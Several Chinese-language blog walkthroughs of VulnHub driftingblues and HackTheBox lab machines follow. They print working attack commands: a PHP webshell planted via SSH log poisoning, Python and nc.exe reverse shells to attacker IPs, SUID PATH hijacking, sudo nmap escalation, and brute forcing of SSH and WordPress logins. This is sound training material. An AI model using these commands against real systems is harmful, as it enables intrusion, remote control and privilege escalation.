        <content type="html"><![CDATA[<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">arp-scan -l</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/13/gbHz2QBdPq1Fr5m.png"></p><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -sC -sV -p- <span class="number">192.168.62.173</span> </span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/13/dyUSqGQHbJYXtcP.png"></p><p>只开放了22和80端口，先访问80端口看看</p><p><img src="https://i.loli.net/2021/10/13/v23PbJpqjdwMiXl.png"></p><p>好像没有什么信息，扫一下目录</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">62.173</span>/</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/13/QvTbR73iftpaIZY.png"></p><p>有点奇怪，逐个看了一下，好像都是没用的信息</p><p><img src="https://i.loli.net/2021/10/13/DcIX8Bov5bh4KlS.png"></p><p>再看看robots.txt，是唯一有用的路径</p><p><img src="https://i.loli.net/2021/10/13/Z97ixT5SKCVjzuy.png"></p><p>接着访问一下</p><p><img src="https://i.loli.net/2021/10/13/RnyvEz1OImLurMZ.png"></p><p>emmm再接再厉，继续访问</p><p><img src="https://i.loli.net/2021/10/13/dWAkgJ5BQLy81OI.png"></p><p>好像是诗歌还是歌词，目前没有什么信息，查看一下源码</p><p><img src="https://i.loli.net/2021/10/13/hV3pdTlWcbvkABE.png"></p><p>base64编码，到在线网站转换一下</p><img src="https://i.loli.net/2021/10/13/8EgkBodRq1YjAOH.png" style="zoom: 67%;" /><p>哎，还要再转换一次</p><img src="https://i.loli.net/2021/10/13/KC1QoRcmuTqG4fE.png" style="zoom:67%;" /><p>提示了一个php文件，去访问一下</p><p><img src="https://i.loli.net/2021/10/13/JPCuhSeUZXnOkRq.png"></p><h3 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h3><p>这个php文件是应该ssh登录日志，先随便尝试一下登录，看会不会有记录</p><p><img src="https://i.loli.net/2021/10/13/nFKbN5to2rTjSHa.png"></p><p>可以看到两个登录用户名都已经记录了，那接下来就尝试通过日志写shell</p><p><img src="https://i.loli.net/2021/10/13/UXd7Z2kRHJmP8cu.png"></p><h3 id="漏洞利用-amp-getshell"><a href="#漏洞利用-amp-getshell" class="headerlink" title="漏洞利用&amp;getshell"></a>漏洞利用&amp;getshell</h3><p>以php的webshell作为用户名来登录ssh</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">ssh &#x27;</span><span class="php"><span class="meta">&lt;?php</span> system(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);<span class="meta">?&gt;</span></span><span class="xml">&#x27;@192.168.62.173</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/13/VQBO5Tumo1YRdLN.png"></p><p>看一下效果，看到已经可以执行命令了</p><p><img src="https://i.loli.net/2021/10/13/hEsStkQvywi58UL.png"></p><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>先看一下有没有python环境</p><p><img src="https://i.loli.net/2021/10/13/JajMB9ytKZoHbur.png"></p><p>可以看到，靶机是有python3环境的，那就试试python来反弹shell</p><p>先开启一个监听端口来接收反弹的shell</p><p><img src="https://i.loli.net/2021/10/13/e6KnGq2tVahXDj3.png"></p><p>访问一下</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">192.168.62.173</span>/adminsfixit.php?cmd=python%<span class="number">20</span>-c%<span class="number">20</span>%<span class="number">27</span>import%<span class="number">20</span>socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%<span class="number">22192</span>.<span class="number">168</span>.<span class="number">62</span>.<span class="number">134</span>%<span class="number">22</span>,<span class="number">1234</span>));os.dup<span class="number">2</span>(s.fileno(),<span class="number">0</span>);%<span class="number">20</span>os.dup<span class="number">2</span>(s.fileno(),<span class="number">1</span>);os.dup<span class="number">2</span>(s.fileno(),<span class="number">2</span>);import%<span class="number">20</span>pty;%<span class="number">20</span>pty.spawn(%<span class="number">22</span>/bin/bash%<span class="number">22</span>)%<span class="number">27</span></span><br></pre></td></tr></table></figure><p>在本机已经接收到了shell</p><p><img src="https://i.loli.net/2021/10/13/i1go6kHnBwEvKqZ.png"></p><h4 id="SSH登录"><a href="#SSH登录" class="headerlink" title="SSH登录"></a>SSH登录</h4><p>进入到/home/robertj目录，发现.ssh是有写权限的，那我们就可以将我们的公钥写进去，实现免密登录</p><p>先在本地生成公私钥</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen<span class="meta">#一直回默认就可以</span></span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/10/13/uRrKZvgWmeOd2wz.png" style="zoom:80%;" /><p>进入本地ssh目录，查看一下id_rsa.pub</p><p><img src="https://i.loli.net/2021/10/13/86VYpyWAalHc1I3.png"></p><p>将id_rsa.pub的内容复制到authorized_keys</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> id_rsa.pub &gt;&gt; authorized_keys</span><br></pre></td></tr></table></figure><p>然后上传到靶机的ssh目录，先在本机用python开启一个http服务</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">python3</span> -m http.server <span class="number">80</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/13/McPewFdQo6hHbUx.png"></p><p>到靶机的ssh目录通过wget下载</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">62.134</span>/authorized_keys</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/13/Gj84pDCxswU3HM5.png"></p><p>现在可以实现ssh免密登录了</p><p><img src="https://i.loli.net/2021/10/13/IhaoP4B9NQnbAKF.png"></p><p>先获取第一个flag</p><img src="https://i.loli.net/2021/10/13/KzHwX46Zqn2ux51.png" style="zoom:67%;" /><h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>先看一下具有suid的可执行文件</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/13/K9mLIjMbpYq5Du2.png"></p><p>看到有一个getinfo命令，先执行一下看看</p><img src="https://i.loli.net/2021/10/13/JMgydKAf6sW3wYE.png"  /><p>看着应该是分别执行了ip a、cat /etc/hosts、uname -a命令</p><p>那么执行具有suid的getinfo时，将会执行ip、cat、uname，那我们就可以写一个模拟可执行文件</p><p>这里我在tmp目录新建一个文件ip，并赋予执行权限</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="string">&quot;/bin/bash&quot;</span> &gt; <span class="regexp">/tmp/i</span>p</span><br><span class="line">chmod +x <span class="regexp">/tmp/i</span>p</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/13/vGzTbRejQkKW7NB.png"></p><p>最后，添加一个环境变量/tmp，这样再执行一次具有suid的getinfo时，就会以root权限执行我们新建的/tmp/ip，我们就可以提权到root了</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">export</span> <span class="attribute">PATH</span>=/tmp:$PATH</span><br><span class="line">/usr/bin/getinfo</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/13/jafxOrYPwXck6SQ.png"></p><p>现在可以获取第二个flag了</p><img src="https://i.loli.net/2021/10/13/N6vYROXlgVuKbWU.png" style="zoom:67%;" />]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VulnHub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>driftingblues2 VulnHub Walkthrough</title>
      <link href="/2021/10/12/driftingblues2-VulnHub-Walkthrough/"/>
      <url>/2021/10/12/driftingblues2-VulnHub-Walkthrough/</url>
      
        <content type="html"><![CDATA[<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">arp-scan -l</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/12/DINClwUz2k5udbh.png"></p><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -sC -sV -p- <span class="number">192.168.62.171</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/12/VsW7DF1kaZpogI2.png"></p><p>开放端口：21(ftp)、22(ssh)、80(http)</p><p>可以匿名访问ftp服务，有一张图片，应该有隐藏的信息</p><p><img src="https://i.loli.net/2021/10/12/pk4b8jfBOyKsQSg.png"></p><img src="https://i.loli.net/2021/10/12/dEbtcZYKkvzCOBG.jpg" style="zoom: 25%;" /><p>图片先放着，访问80端口没什么东西，扫一下目录</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">62.171</span>/</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/12/orNt14jPdbzLQYT.png"></p><p>有个blog的路径，是wordpress搭建的，修改一下host文件再访问一下</p><p><img src="https://i.loli.net/2021/10/12/EPg4VSAOrdJUueH.png"></p><p><img src="https://i.loli.net/2021/10/12/Em8lMOsAgatJIwj.png"></p><p>用wpscan简单扫描没有发现有用信息，那就枚举一下出用户名</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http:<span class="regexp">//</span>driftingblues.box<span class="regexp">/blog/</span> -e u</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/12/xW2hE8bMkJrjP9O.png"></p><p>再通过获取到的用户名albert，试试爆破密码</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http:<span class="regexp">//</span>driftingblues.box<span class="regexp">/blog/</span> -U albert -P <span class="regexp">/usr/</span>share<span class="regexp">/wordlists/</span>rockyou.txt</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/12/6jwKtnJf4hSdF9o.png"></p><p>稍微等了一会就成功爆破出来了密码，那就用获取到的账号密码<code>albert:scotland1</code>登录后台</p><p><img src="https://i.loli.net/2021/10/12/h6NLpYQCBe82ds3.png"></p><h3 id="Get-Shell"><a href="#Get-Shell" class="headerlink" title="Get Shell"></a>Get Shell</h3><p>通过修改主题的404.php来反弹shell</p><p><img src="https://i.loli.net/2021/10/12/9ONakjD2EB6ny4u.png"></p><p>修改后先开启一个监听端口来接受shell</p><p><img src="https://i.loli.net/2021/10/12/a8W6ZkJjGcMBlpF.png"></p><p>访问404.php成功反弹shell</p><p><img src="https://i.loli.net/2021/10/12/lDcPjpYvOqwobHB.png"></p><p><img src="https://i.loli.net/2021/10/12/7DuRciGkKm6JsyT.png"></p><p>靶机有python环境，可以获取一个交互式的shell</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="symbol">&#x27;import</span> pty;pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/12/HuvbSQOLFjsTfZp.png"></p><p>进入到freddie的家目录，有ssh的key，我们将id_rsa下载到本地，进行免密登录</p><p><img src="https://i.loli.net/2021/10/12/WAjV4Iuz61xQXi5.png"></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ssh</span> freddie@<span class="number">192.168.62.171</span> -i id_rsa</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/12/43WwvJiHIplaFgf.png"></p><p>得到第一个flag</p><img src="https://i.loli.net/2021/10/12/1taln9PfMDVAb3v.png" style="zoom: 67%;" /><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p><img src="https://i.loli.net/2021/10/12/A9zQxtDdcq8kEjp.png"></p><p>可以看出来，接下来需要用nmap提权</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;os.execute(&#x27;/bin/sh&#x27;)&quot;</span> &gt; <span class="keyword">shell</span>.nse &amp;&amp; sudo <span class="keyword">nmap</span> --script=<span class="keyword">shell</span>.nse</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/12/yVPcajOXnBzpASK.png"></p><p>执行完获得root权限，但此时是看不到输入的，接着执行</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">reset</span></span><br></pre></td></tr></table></figure><p>这时就可以获取第二个flag了</p><img src="https://i.loli.net/2021/10/12/b5u36MeOmTI7w41.png" style="zoom:67%;" /><p>所以，一开始获取的图片还是没用上</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VulnHub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>driftingblues VulnHub Walkthrough</title>
      <link href="/2021/10/12/driftingblues-VulnHub-Walkthrough/"/>
      <url>/2021/10/12/driftingblues-VulnHub-Walkthrough/</url>
      
        <content type="html"><![CDATA[<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">arp-scan -l</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/12/OmNE8evaC2VQzZc.png"></p><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -sC -sV -p- <span class="number">192.168.62.172</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/12/9LTWKF2Irw3bBn4.png"></p><p>只开放了22和80端口，只能先访问80端口看一下有没有什么信息</p><p><img src="https://i.loli.net/2021/10/12/3aTXBh7Au61snxe.png"></p><p>好像没什么东西，扫了目录也没什么信息</p><p><img src="https://i.loli.net/2021/10/12/89FHODkPsiIKq3A.png"></p><p>右键查看源码，看到了一串疑似base64编码的字符串，到在线网站上转换一下，这应该是一个路径</p><p><img src="https://i.loli.net/2021/10/12/F4z37IMB6HRTbN8.png"></p><p>访问一下，这个很明显了，到在线的ook!解密网站解密一下</p><p><img src="https://i.loli.net/2021/10/12/f3Y5qmlHkdy4UO2.png"></p><p>是一个提示，应该是要修改host文件</p><p><img src="https://i.loli.net/2021/10/12/2A8K7SIUoW3ZYCJ.png"></p><p>在主页上可以看到一个域名，尝试添加到host再访问</p><p><img src="https://i.loli.net/2021/10/12/yrY1VEOUn7ZNJuf.png"></p><p><img src="https://i.loli.net/2021/10/12/m8XTnM4pqJRSxYI.png"></p><p>重新扫目录还是没有发现，那就试试爆破子域名</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -u driftingblues.box -w <span class="regexp">/home/</span>colin<span class="regexp">/文档/</span>fuzzDicts<span class="regexp">/subdomainDicts/m</span>ain.txt -H <span class="string">&quot;Host:FUZZ.driftingblues.box&quot;</span> --hw <span class="number">570</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/12/IhLMdEA75BqWY8J.png"></p><p>直接访问解析不了，需要再修改一下host</p><p><img src="https://i.loli.net/2021/10/12/9HeMXPp4nxUc5T3.png"></p><p>访问一下</p><p><img src="https://i.loli.net/2021/10/12/rQZJMdo6itON41X.png"></p><p>再扫一次目录，发现有robots.txt</p><p><img src="https://i.loli.net/2021/10/12/h8NRS47k5FwcyQP.png"></p><p>访问一下，看到给了一些路径</p><p><img src="https://i.loli.net/2021/10/12/hqH8zidLMpy2B4b.png"></p><p>查看ssh_cred.txt，给了提示</p><p><img src="https://i.loli.net/2021/10/12/lO2CwcisZyFhX7Q.png"></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>ssh登录的密码是<code>1mw4ckyyucky*</code>，目前还缺一位数字，一共十个可能的密码，先生成一下</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">crunch</span> <span class="number">13</span> <span class="number">13</span> -t <span class="number">1</span>mw<span class="number">4</span>ckyyucky% &gt; pass</span><br></pre></td></tr></table></figure><p>看一下我们生成的密码集合</p><p><img src="https://i.loli.net/2021/10/12/LKM18PeBjnQ3EmN.png"></p><p>接下来尝试爆破ssh登录密码，根据前面访问<code>test.driftingblues.box</code>的提示，用户名应该是<code>eric</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l eric -P pass ssh:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">62.172</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/12/DEn1wX8sbvx3KPy.png"></p><p>找到密码了，直接登录ssh</p><p><img src="https://i.loli.net/2021/10/12/tR6dFViCTaYM3gk.png"></p><p>直接获取第一个flag</p><img src="https://i.loli.net/2021/10/12/R6CWvfVqErO29Az.png" style="zoom:67%;" /><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br><span class="line"><span class="keyword">find</span> <span class="regexp">/ -perm -u=s -type f 2&gt;/</span>dev/<span class="keyword">null</span></span><br><span class="line">getcap -r  <span class="regexp">/ 2&gt;/</span>dev/<span class="keyword">null</span></span><br></pre></td></tr></table></figure><p>看了一遍都没有什么发现，只能看一看有没有什么其他可以利用的地方</p><p>在备份目录下有个backup.sh，看一下内容</p><p><img src="https://i.loli.net/2021/10/12/y8jaFm2eGTYUiXo.png"></p><p>有一个sudo执行的/tmp/emergency，但是tmp目录下是没有这个文件的，所以应该通过新建文件来提权</p><p>思路是这样，但还是不知道怎么操作，只能看看别人的walkthrough了</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> &#x27;cp <span class="string">/bin/bash</span> <span class="string">/tmp/getroot</span>; chmod +s <span class="string">/tmp/getroot</span>&#x27; &gt; <span class="string">/tmp/emergency</span></span><br><span class="line"><span class="comment">#系统执行backup.up，以sudo执行emergency，会将/bin/bash复制到tmp，并赋予执行权限</span></span><br><span class="line">chmod +x emergency</span><br><span class="line"><span class="string">./getroot</span> -p</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/12/jWGusDP8aTNwCgS.png"></p><p><img src="https://i.loli.net/2021/10/12/lRnyG9txiQKuYW5.png"></p><p>现在可以获取第二个flag了</p><img src="https://i.loli.net/2021/10/12/bWHGwDhZx1cTntf.png" style="zoom:67%;" /><blockquote><p>参考：</p><p><a href="https://blog.csdn.net/weixin_45922278/article/details/115277255">https://blog.csdn.net/weixin_45922278/article/details/115277255</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VulnHub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox-Shield</title>
      <link href="/2021/08/18/HackTheBox-Shield/"/>
      <url>/2021/08/18/HackTheBox-Shield/</url>
      
        <content type="html"><![CDATA[<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p><img src="https://i.loli.net/2021/08/18/JNCVaw9LHIbsg3t.png"></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><strong>端口扫描</strong>：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">namp</span> -A -T<span class="number">4</span> <span class="number">10.10.10.29</span></span><br></pre></td></tr></table></figure><p>发现80、3306两个端口，IIS 10.0和MySQL，服务器操作系统为Windows</p><p><img src="https://i.loli.net/2021/08/18/HW1B7cVIfSkOhjw.png"></p><p><code>--script vuln</code>参数扫描常见漏洞 ，发现wordpress目录，已经扫到了登录地址</p><p><img src="https://i.loli.net/2021/08/18/sWYHtKiGoMcAaBZ.png"></p><p><strong>目录扫描</strong>，也发现wordpress目录</p><p><img src="https://i.loli.net/2021/08/18/BjKiP1malH3YsuM.png"></p><p><strong>Wpscan分析</strong>，可以看到wordpress的版本</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http:<span class="regexp">//</span><span class="number">10.10</span>.<span class="number">10.29</span>/wordpress</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/18/o7IeKRkylwbXUn9.png"></p><h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><p>用上一台靶机的账号密码可以登录后台<code>admin</code>:<code>P@s5w0rd!</code></p><p><img src="https://i.loli.net/2021/08/18/h7Av2EPBGHcOQus.png"></p><p>知道wordpress admin用户密码的情况下，可以使用msf的wp_admin_shell_upload模块来攻击，使用模块</p><p><img src="https://i.loli.net/2021/08/18/DvtE9xOQMcVGirR.png"></p><p>设置参数</p><p><img src="https://i.loli.net/2021/08/18/HdxmVPoLYhGXpQi.png"></p><p>执行exploit命令后，获得shell</p><p><img src="https://i.loli.net/2021/08/18/IEwiRplZgf9TKaG.png"></p><p>在shell中执行命令</p><p><img src="https://i.loli.net/2021/08/18/srdiD4wGRj6Y28b.png"></p><p>查看wp-config.php，发现敏感信息</p><p><img src="https://i.loli.net/2021/08/18/VhwTivWuomxFJ6P.png"></p><p><strong>反弹shell</strong>：</p><p>在kali终端输入nc -nlvp 1234，用来在本机启动一个监听端口</p><p><img src="https://i.loli.net/2021/08/18/vxTqUfBDVaeGoh9.png"></p><p>在meterpreter中执行nc命令来连接本机监听端口，使用netcat获得windows shell</p><p><img src="https://i.loli.net/2021/08/18/1pl42ztmeAabDH6.png"></p><p><img src="https://i.loli.net/2021/08/18/3NOZ5os7CcgDY6i.png"></p><p>查看当前用户</p><p><img src="https://i.loli.net/2021/08/18/iBAZEls5vNMDaCV.png"></p><p><strong>提权:</strong></p><p>使用juicy-potato提权，将JuicyPotato.exe重命成js.exe，防止被对方检测到</p><p>将js.exe上传到对方机器</p><p><img src="https://i.loli.net/2021/08/18/DnehVMrIUajwFxO.png"></p><p>在windows shell中生成一个bat脚本：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo START C:<span class="symbol">\i</span>netpub<span class="symbol">\w</span>wwroot<span class="symbol">\w</span>ordpress<span class="symbol">\w</span>p-content<span class="symbol">\u</span>ploads<span class="symbol">\n</span>c.exe -e powershell.exe 10.10.14.107 1111 &gt; shell.bat</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/18/fZpgGSrAEs9dial.png"></p><p>在本机使用nc创建一个监听端口，用来接收提权后的windows shell</p><p><img src="https://i.loli.net/2021/08/18/bWQDZ2VAGyPEIUl.png"></p><p>运行juicy-potato提权：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">js.exe -t * -p C:<span class="symbol">\i</span>netpub<span class="symbol">\w</span>wwroot<span class="symbol">\w</span>ordpress<span class="symbol">\w</span>p-content<span class="symbol">\u</span>ploads<span class="symbol">\s</span>hell.bat -l 1337</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/18/4oZuXGiTzAqLfr9.png"></p><p>获得system权限的windows shell</p><p><img src="https://i.loli.net/2021/08/18/8kDL9GwTJj2mexP.png"></p><p>在管理员账户的桌面目录下找到flag</p><p><img src="https://i.loli.net/2021/08/18/MVPFeo2z4nisyDp.png"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox-Oopsie</title>
      <link href="/2021/08/02/HackTheBox-Oopsie/"/>
      <url>/2021/08/02/HackTheBox-Oopsie/</url>
      
        <content type="html"><![CDATA[<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p><img src="https://i.loli.net/2021/07/27/Hd9VUzsDhXpJxSb.png"></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><strong>端口扫描：</strong></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -sT -Pn <span class="number">10.10.10.28</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/27/ZD8N9JvCn3Gtkyc.png"></p><p>发现80端口开放，在浏览器打开，啥也没有，尝试找登录界面</p><p><img src="https://i.loli.net/2021/07/27/bexZV7YuQCfHnJW.png"></p><p><strong>目录扫描：</strong></p><p>成功找到登录界面</p><p><img src="https://i.loli.net/2021/07/27/apWtD5Xlgq4KrkH.png"></p><p>在bp中也可以看到登录页的js加载记录</p><p><img src="https://i.loli.net/2021/07/27/2RtDTbzapGBCWhv.png"></p><p>在浏览器打开</p><p><img src="https://i.loli.net/2021/07/27/5NhiCuwZTcWxtLd.png"></p><h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><p>账号为<code>admin</code>，密码是上一题中出现过的<code>MEGACORP_4dm1n!!</code>，直接登录，登录后看到有一个上传功能，点击提示需要super admin权限</p><p><img src="https://i.loli.net/2021/07/27/ExH9yqfplFRc6be.png"></p><p>先看一下我们现在账号信息，在url中还可以看到目前的用户id=1</p><p><img src="https://i.loli.net/2021/07/27/c4GRbMgQoK1pqf9.png"></p><p><strong>再抓包看一下</strong>：</p><p>id和user、role对应，可以尝试遍历用户</p><p><img src="https://i.loli.net/2021/07/27/NQDFYJsuVKjvtUG.png"></p><p><strong>发送到interlude模块</strong>，标记id参数，设置好payload开始爆破</p><p><img src="https://i.loli.net/2021/07/27/IO7bRopKTVdyeEN.png"></p><p><img src="https://i.loli.net/2021/07/27/jAMXOz6hqZakGB3.png"></p><p>看到id=30的响应包的长度比较大，看一下他的响应包的内容，确认为super admin用户</p><p><img src="https://i.loli.net/2021/07/27/bH7zidyqvxF3sQL.png"></p><p><img src="https://i.loli.net/2021/07/27/Z2itEGU1TQspdwe.png"></p><p>修改目前用户的user和role值，成功越权到super admin用户</p><p><img src="https://i.loli.net/2021/07/27/D4Zw8Bkz39QbPyT.png"></p><p><img src="https://i.loli.net/2021/07/27/EM872nWlGr6Qcux.png"></p><p>然后尝试上传shell，同样修改当前用户的user和role值，就可以进行文件上传</p><p><img src="https://i.loli.net/2021/07/27/qmQXoHtZi2lV1By.png"></p><p>直接用kali自带的反弹shell文件，修改好ip和port</p><p><img src="https://i.loli.net/2021/07/27/dqBTIuL8E36UJXf.png"></p><p>注意上传的过程中也要修改当前用户的user和role，改成super admin的值，就可以成功上传</p><p><img src="https://i.loli.net/2021/07/27/zmrJRpM73eCjV9q.png"></p><p><img src="https://i.loli.net/2021/07/27/hnu7MqHeKplP8oF.png"></p><p>接下来开启一个监听端口来接收反弹的shell</p><p><img 